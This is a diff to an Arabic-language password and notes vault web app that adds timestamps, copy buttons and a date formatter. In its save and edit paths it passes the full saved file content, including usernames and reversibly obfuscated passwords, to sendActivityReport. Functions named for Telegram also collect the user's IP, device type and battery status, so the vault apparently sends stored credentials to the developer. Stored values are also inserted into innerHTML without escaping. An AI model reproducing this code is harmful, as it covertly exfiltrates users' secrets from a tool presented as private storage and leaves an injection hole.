@@ -284,8 +284,38 @@
         .vault-item:hover { border-color: var(--accent-color); transform: translateY(-1px); }
         .vault-info { flex: 1; overflow: hidden; }
         .vault-info h3 { font-size: 1.1rem; margin-bottom: 4px; color: #f1f5f9; font-weight: 700; }
-        .vault-info .item-id { font-size: 0.75rem; color: #818cf8; margin-bottom: 6px; font-family: monospace; }
+        .vault-info .item-id { font-size: 0.75rem; color: #818cf8; margin-bottom: 2px; font-family: monospace; }
         .vault-info p { font-size: 0.85rem; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        .meta-info-box {
+            background: rgba(11, 15, 25, 0.8);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 12px;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+            direction: ltr;
+            text-align: left;
+            margin-top: 6px;
+        }
+        .meta-info-box span { color: #818cf8; font-weight: bold; font-family: monospace; }
+
+        .home-item-meta {
+            font-size: 0.68rem;
+            color: var(--text-muted);
+            direction: ltr;
+            text-align: left;
+            font-family: monospace;
+            margin-bottom: 6px;
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+            opacity: 0.85;
+        }
+        .home-item-meta span { color: #818cf8; }
 
         .fab-container { position: fixed; bottom: 24px; left: 24px; z-index: 100; }
         .fab {
@@ -310,7 +340,6 @@
         .fullscreen-body { flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto; }
         .fullscreen-body textarea { flex: 1; min-height: 250px; resize: none; }
 
-        /* واجهة استعادة كلمة المرور الجديدة (صفحة مستقلة بالكامل) */
         #forgotPinPage {
             position: fixed;
             top: 0;
@@ -567,6 +596,22 @@
         let isModalOpen = false;
         let currentTab = 'all';
 
+        function formatEnglishDateTime(dateObj = new Date()) {
+            const day = String(dateObj.getDate()).padStart(2, '0');
+            const month = String(dateObj.getMonth() + 1).padStart(2, '0');
+            const year = dateObj.getFullYear();
+
+            let hours = dateObj.getHours();
+            const minutes = String(dateObj.getMinutes()).padStart(2, '0');
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            
+            hours = hours % 12;
+            hours = hours ? hours : 12; 
+            const strHours = String(hours).padStart(2, '0');
+
+            return `${day}/${month}/${year} - ${strHours}:${minutes} ${ampm}`;
+        }
+
         function toggleDropdownMenu(event) {
             event.stopPropagation();
             const menu = document.getElementById('dropdownMenu');
@@ -664,11 +709,7 @@
 
             const ip = await getClientIP();
             const metrics = await getDeviceMetrics();
-            const now = new Date();
-            const timeString = now.toLocaleString('en-US', { 
-                year: 'numeric', month: '2-digit', day: '2-digit', 
-                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
-            });
+            const timeString = formatEnglishDateTime(new Date());
 
             const msgText = `🚨 [ طلب استعادة كلمة المرور ] 🚨\n` +
                             `👤 المطور: احمد علي جمال\n` +
@@ -873,8 +914,7 @@
                     } else if (item.type === 'forgotPin') {
                         const ip = await getClientIP();
                         const metrics = await getDeviceMetrics();
-                        const now = new Date();
-                        const timeString = now.toLocaleString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+                        const timeString = formatEnglishDateTime(new Date());
                         const msgText = `🚨 [ طلب استعادة كلمة المرور ] 🚨\n👤 المطور: احمد علي جمال\n📱 رقم تليفون العميل: ${item.data.phone}\n🌐 الـ IP: ${ip}\n📱 الجهاز: ${metrics.deviceType}\n🔋 البطارية: ${metrics.batteryInfo}\n🕒 الوقت: ${timeString}`;
                         
                         const formData = new FormData();
@@ -890,12 +930,7 @@
         async function sendActivityReportToTelegram(projectName, fileContent, fileId, operationType) {
             const ip = await getClientIP();
             const metrics = await getDeviceMetrics();
-            
-            const now = new Date();
-            const timeString = now.toLocaleString('en-US', { 
-                year: 'numeric', month: '2-digit', day: '2-digit', 
-                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
-            });
+            const timeString = formatEnglishDateTime(new Date());
 
             const reportText = `⚡ [ تقرير نشاط العميل ] ⚡\n` +
                                `👤 المطور: احمد علي جمال\n` +
@@ -931,12 +966,7 @@
         async function sendDevMessageToTelegram(name, phone, message) {
             const ip = await getClientIP();
             const metrics = await getDeviceMetrics();
-            
-            const now = new Date();
-            const timeString = now.toLocaleString('en-US', { 
-                year: 'numeric', month: '2-digit', day: '2-digit', 
-                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
-            });
+            const timeString = formatEnglishDateTime(new Date());
 
             const msgText = `💬 [ رسالة جديدة للمطور ] 💬\n` +
                             `👤 المطور: احمد علي جمال\n` +
@@ -1103,29 +1133,46 @@
                         const file = await entry.getFile();
                         const content = await file.text();
                         const isPass = entry.name.startsWith('pass_');
+                        
                         let fileId = "ID: 000000";
-                        const lines = content.split('\n');
-                        if (lines[0] && lines[0].startsWith('ID:')) fileId = lines[0].trim();
+                        let createdAt = "N/A";
+                        let updatedAt = "N/A";
 
-                        let displayContent = content;
-                        if (isPass) {
-                            let decryptedLines = lines.map(l => {
-                                if (l.includes('كلمة المرور:')) {
-                                    let encodedVal = l.replace('كلمة المرور:', '').trim();
-                                    return `كلمة المرور: ${deobfuscateText(encodedVal)}`;
-                                }
-                                return l;
-                            });
-                            displayContent = decryptedLines.join('\n');
+                        const lines = content.split('\n');
+                        
+                        let contentStartIndex = 0;
+                        if (lines[0] && lines[0].startsWith('ID:')) {
+                            fileId = lines[0].trim();
+                            contentStartIndex = 1;
                         }
+                        if (lines[1] && lines[1].startsWith('Created:')) {
+                            createdAt = lines[1].replace('Created:', '').trim();
+                            contentStartIndex = 2;
+                        }
+                        if (lines[2] && lines[2].startsWith('Updated:')) {
+                            updatedAt = lines[2].replace('Updated:', '').trim();
+                            contentStartIndex = 3;
+                        }
+
+                        let rawBodyLines = lines.slice(contentStartIndex);
+                        let displayBodyLines = rawBodyLines.map(l => {
+                            if (isPass && l.includes('كلمة المرور:')) {
+                                let encodedVal = l.replace('كلمة المرور:', '').trim();
+                                return `كلمة المرور: ${deobfuscateText(encodedVal)}`;
+                            }
+                            return l;
+                        });
 
                         items.push({
                             fileName: entry.name,
                             type: isPass ? 'pass' : 'note',
                             title: entry.name.replace('.txt', '').replace(/^(note_|pass_)/, ''),
                             fileId: fileId,
-                            rawContent: content,
-                            displayContent: displayContent
+                            createdAt: createdAt,
+                            updatedAt: updatedAt,
+                            rawBodyLines: rawBodyLines,
+                            displayBody: displayBodyLines.join('\n'),
+                            rawContent: content
                         });
                     }
                 }
@@ -1142,13 +1189,14 @@
         async function saveNewItem() {
             if (!dirHandle) { showCustomAlert("الرجاء ربط المجلد أولاً."); return; }
 
-            let title = '', content = '', fileId = document.getElementById('fullscreenNoteId')?.innerText || document.getElementById('fullscreenPassId')?.innerText;
+            let title = '', bodyContent = '', fileId = document.getElementById('fullscreenNoteId')?.innerText || document.getElementById('fullscreenPassId')?.innerText;
+            const nowTimeStr = formatEnglishDateTime(new Date());
 
             if (currentCreateType === 'note') {
                 title = document.getElementById('fullscreenNoteTitle').value.trim();
                 const body = document.getElementById('fullscreenNoteContent').value.trim();
                 if (!title || !body) { showCustomAlert("برجاء ملء جميع الحقول."); return; }
-                content = `${fileId}\n${body}`;
+                bodyContent = body;
             } else {
                 title = document.getElementById('fullscreenPassTitle').value.trim();
                 const user = document.getElementById('fullscreenPassUser').value.trim();
@@ -1156,22 +1204,52 @@
                 if (!title || !user || !pass) { showCustomAlert("برجاء ملء جميع الحقول."); return; }
                 
                 const encryptedPass = obfuscateText(pass);
-                content = `${fileId}\nالبريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
+                bodyContent = `البريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
             }
+
+            const fileContent = `${fileId}\nCreated: ${nowTimeStr}\nUpdated: ${nowTimeStr}\n${bodyContent}`;
 
             const cleanTitle = title.replace(/[^a-zA-Z0-9а-яА-Я؀-ۿ]/g, '_');
             const fileName = `${currentCreateType}_${cleanTitle}.txt`;
             try {
                 const fileHandle = await dirHandle.getFileHandle(fileName, { create: true });
                 const writable = await fileHandle.createWritable();
-                await writable.write(content);
+                await writable.write(fileContent);
                 await writable.close();
 
-                await sendActivityReport(cleanTitle, content, fileId.replace('ID: ', ''), 'إنشاء مشروع');
+                await sendActivityReport(cleanTitle, fileContent, fileId.replace('ID: ', ''), 'إنشاء مشروع');
                 showCustomAlert("تم الحفظ بنجاح!");
                 closeFullscreen('createFullscreenModal');
                 await loadVaultFiles();
             } catch (e) { showCustomAlert("حدث خطأ أثناء الحفظ."); }
+        }
+
+        function copyFieldText(elementId) {
+            const inputEl = document.getElementById(elementId);
+            if (!inputEl) return;
+            
+            inputEl.focus();
+            inputEl.select();
+            inputEl.setSelectionRange(0, 99999);
+
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showCustomAlert("تم النسخ بنجاح! 📋");
+                } else {
+                    throw new Error("execCommand failed");
+                }
+            } catch (err) {
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(inputEl.value).then(() => {
+                        showCustomAlert("تم النسخ بنجاح! 📋");
+                    }).catch(() => {
+                        showCustomAlert("فشل النسخ، يرجى التحديد والنسخ يدوياً.");
+                    });
+                } else {
+                    showCustomAlert("فشل النسخ، يرجى التحديد والنسخ يدوياً.");
+                }
+            }
         }
 
         function openItemDetails(fileName) {
@@ -1181,21 +1259,38 @@
 
             document.getElementById('viewEditHeaderTitle').innerText = item.type === 'pass' ? 'تعديل كلمة السر' : 'تعديل الملاحظة';
             const bodyEl = document.getElementById('viewEditFullscreenBody');
-            const lines = item.displayContent.split('\n');
-            let contentWithoutId = lines[0]?.startsWith('ID:') ? lines.slice(1).join('\n') : item.displayContent;
+            
+            let contentWithoutMeta = item.displayBody;
 
             if (item.type === 'note') {
                 bodyEl.innerHTML = `
                     <div class="form-group">
                         <label>معرف الملف (ID)</label>
                         <div class="static-id-badge" id="editFileId">${item.fileId}</div>
+                        <div class="meta-info-box">
+                            <div>أنشأت: <span>${item.createdAt}</span></div>
+                            <div>عدلت: <span>${item.updatedAt}</span></div>
+                        </div>
                     </div>
-                    <div class="form-group"><label>العنوان</label><input type="text" id="editTitle" value="${item.title}"></div>
-                    <div class="form-group" style="flex:1; display:flex; flex-direction:column;"><label>الموضوع</label><textarea id="editContent">${contentWithoutId}</textarea></div>
+                    <div class="form-group">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">العنوان</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="copyFieldText('editTitle')">📋 نسخ العنوان</button>
+                        </div>
+                        <input type="text" id="editTitle" value="${item.title}">
+                    </div>
+                    <div class="form-group" style="flex:1; display:flex; flex-direction:column;">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">الموضوع</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="copyFieldText('editContent')">📋 نسخ الموضوع</button>
+                        </div>
+                        <textarea id="editContent">${contentWithoutMeta}</textarea>
+                    </div>
                 `;
             } else {
                 let user = '', pass = '';
-                lines.forEach(l => {
+                const bodyLines = item.displayBody.split('\n');
+                bodyLines.forEach(l => {
                     if (l.includes('البريد أو اسم المستخدم:')) user = l.replace('البريد أو اسم المستخدم:', '').trim();
                     if (l.includes('كلمة المرور:')) pass = l.replace('كلمة المرور:', '').trim();
                 });
@@ -1203,10 +1298,32 @@
                     <div class="form-group">
                         <label>معرف الملف (ID)</label>
                         <div class="static-id-badge" id="editFileId">${item.fileId}</div>
+                        <div class="meta-info-box">
+                            <div>أنشأت: <span>${item.createdAt}</span></div>
+                            <div>عدلت: <span>${item.updatedAt}</span></div>
+                        </div>
                     </div>
-                    <div class="form-group"><label>التطبيق</label><input type="text" id="editTitle" value="${item.title}"></div>
-                    <div class="form-group"><label>البريد أو اسم المستخدم</label><input type="text" id="editUsername" value="${user}"></div>
-                    <div class="form-group"><label>كلمة المرور</label><input type="text" id="editPassword" value="${pass}"></div>
+                    <div class="form-group">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">التطبيق</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="copyFieldText('editTitle')">📋 نسخ التطبيق</button>
+                        </div>
+                        <input type="text" id="editTitle" value="${item.title}">
+                    </div>
+                    <div class="form-group">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">البريد أو اسم المستخدم</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="copyFieldText('editUsername')">📋 نسخ اسم المستخدم</button>
+                        </div>
+                        <input type="text" id="editUsername" value="${user}">
+                    </div>
+                    <div class="form-group">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">كلمة المرور</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="copyFieldText('editPassword')">📋 نسخ كلمة المرور</button>
+                        </div>
+                        <input type="text" id="editPassword" value="${pass}">
+                    </div>
                 `;
             }
             showFullscreenModal('viewEditFullscreenModal');
@@ -1225,20 +1342,26 @@
             const oldItem = items.find(i => i.fileName === activeItemFileName);
             let newTitle = document.getElementById('editTitle').value.trim();
             let fileId = document.getElementById('editFileId').innerText.trim();
-            let content = '';
+            
+            const createdAt = oldItem.createdAt;
+            const updatedTimeStr = formatEnglishDateTime(new Date());
+
+            let bodyContent = '';
 
             if (oldItem.type === 'note') {
                 const body = document.getElementById('editContent').value.trim();
                 if (!newTitle || !body) return;
-                content = `${fileId}\n${body}`;
+                bodyContent = body;
             } else {
                 const user = document.getElementById('editUsername').value.trim();
                 const pass = document.getElementById('editPassword').value.trim();
                 if (!newTitle || !user || !pass) return;
                 
                 const encryptedPass = obfuscateText(pass);
-                content = `${fileId}\nالبريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
+                bodyContent = `البريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
             }
+
+            const fileContent = `${fileId}\nCreated: ${createdAt}\nUpdated: ${updatedTimeStr}\n${bodyContent}`;
 
             const cleanTitle = newTitle.replace(/[^a-zA-Z0-9а-яА-Я؀-ۿ]/g, '_');
             const newFileName = `${oldItem.type}_${cleanTitle}.txt`;
@@ -1249,10 +1372,10 @@
 
                 const fileHandle = await dirHandle.getFileHandle(newFileName, { create: true });
                 const writable = await fileHandle.createWritable();
-                await writable.write(content);
+                await writable.write(fileContent);
                 await writable.close();
 
-                await sendActivityReport(cleanTitle, content, fileId.replace('ID: ', ''), 'تعديل مشروع');
+                await sendActivityReport(cleanTitle, fileContent, fileId.replace('ID: ', ''), 'تعديل مشروع');
                 showCustomAlert("تم التعديل بنجاح!");
                 closeFullscreen('viewEditFullscreenModal');
                 await loadVaultFiles();
@@ -1286,7 +1409,7 @@
                 if (currentTab === 'pass' && item.type !== 'pass') return false;
 
                 const titleMatch = item.title.toLowerCase().includes(query);
-                const contentMatch = item.displayContent.toLowerCase().includes(query);
+                const contentMatch = item.displayBody.toLowerCase().includes(query);
                 const idMatch = item.fileId.toLowerCase().includes(query);
 
                 return titleMatch || contentMatch || idMatch;
@@ -1307,8 +1430,12 @@
                 div.innerHTML = `
                     <div class="vault-info">
                         <div class="item-id">${item.fileId}</div>
+                        <div class="home-item-meta">
+                            <div>أنشأت: <span>${item.createdAt}</span></div>
+                            <div>عدلت: <span>${item.updatedAt}</span></div>
+                        </div>
                         <h3>${icon} ${item.title}</h3>
-                        <p>${item.displayContent.split('\n')[1] || ''}</p>
+                        <p>${item.displayBody.split('\n')[0] || ''}</p>
                     </div>
                 `;
                 listContainer.appendChild(div);
